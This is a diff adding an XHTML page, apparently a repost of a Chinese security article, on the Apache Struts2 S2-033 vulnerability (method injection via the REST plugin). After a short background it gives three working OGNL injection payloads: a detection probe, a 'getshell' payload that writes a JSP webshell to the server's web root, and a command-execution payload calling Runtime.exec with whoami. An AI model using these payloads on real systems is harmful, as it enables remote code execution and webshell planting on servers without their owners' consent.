@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>s2-033三种POC+命令执行绕过</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>s2-033三种POC+命令执行绕过</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzI3NzMzNzE5Ng==&amp;mid=2247483824&amp;idx=1&amp;sn=d6c9a2c5ca14c6d01e94c4446017259a&amp;chksm=eb6684b3dc110da5dd855226e87709ac5ef9ff2b44cbcf1e06c64df0955b0133d7283997e15f&amp;scene=126&amp;sessionid=1681407391#rd">http://mp.weixin.qq.com/s?__biz=MzI3NzMzNzE5Ng==&amp;mid=2247483824&amp;idx=1&amp;sn=d6c9a2c5ca14c6d01e94c4446017259a&amp;chksm=eb6684b3dc110da5dd855226e87709ac5ef9ff2b44cbcf1e06c64df0955b0133d7283997e15f&amp;scene=126&amp;sessionid=1681407391#rd</a></blockquote><p>s2-033背景：</p><p>漏洞建立在032的基础上，还是对method没有进行过滤导致的，但是032的payload的要做转变才能检测</p><p>启用动态调用方法为true</p><p>支持rest插件</p><p>rest介绍：<br/>使用http://localhost:8080/bee/action-name/1/XXX这种请求方式，其实XXX可以是任何合法的名字</p><p>Struts2会查找XXX为名字的方法来调用，比如请求http://localhost:8080/bee/test/1/abc，那么TestAction的public String abc()就会被调用</p><p>检测poc：</p><p><span class="crayon-c">%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]),%23wr.close(),xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908</span></p><p><span class="crayon-c"><br/></span></p><p><span class="crayon-c">getshell POC：</span></p><p><span class="crayon-c"><span class="crayon-c">%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23a%3d%23parameters.reqobj[0],%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get(%23a),%23b%3d%23req.getRealPath(%23c)%2b%23parameters.reqobj[2],%23fos%3dnew java.io.FileOutputStream(%23b),%23fos.write(%23parameters.content[0].getBytes()),%23fos.close(),%23hh%3d%23context.get(%23parameters.rpsobj[0]),%23hh.getWriter().println(%23b),%23hh.getWriter().flush(),%23hh.getWriter().close(),%23parameters.command[0].toString.json?&amp;reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;reqobj=%2f&amp;reqobj=test.jsp&amp;content=</span></span></p><p><span class="crayon-c"><span class="crayon-c"><br/></span></span></p><p><span class="crayon-c"><span class="crayon-c">内容<br/>命令执行POC：</span></span></p><p><span class="crayon-c"><span class="crayon-c"><span class="crayon-c">%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=whoami</span></span></span></p><p>
+		</p><p>
+					
+		<br/></p><p><br/></p><p>			</p><p>
+		</p><p> </p><p><br/></p>
+        
+</body>
+</html>
